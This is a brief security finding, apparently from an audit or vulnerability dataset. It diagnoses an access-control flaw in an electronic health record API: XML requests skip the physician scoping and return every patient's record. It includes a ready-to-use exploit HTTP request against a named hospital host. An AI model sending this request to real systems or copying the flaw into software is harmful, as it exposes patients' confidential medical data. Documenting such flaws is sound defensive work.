diagnosis: ClinicalRecordViewSet overrides get_queryset() to return PatientClinicalRecord.objects.all() whenever the accepted renderer is 'xml'. An authenticated physician or hospital employee requesting Accept: application/xml bypasses the primary_physician scoping and accesses medical records of all patients in the hospital.
exploit_request:
GET /api/ehr/records/ HTTP/1.1
Host: ehr.metrohospital.org
Authorization: Bearer <general_doctor_token>
Accept: application/xml
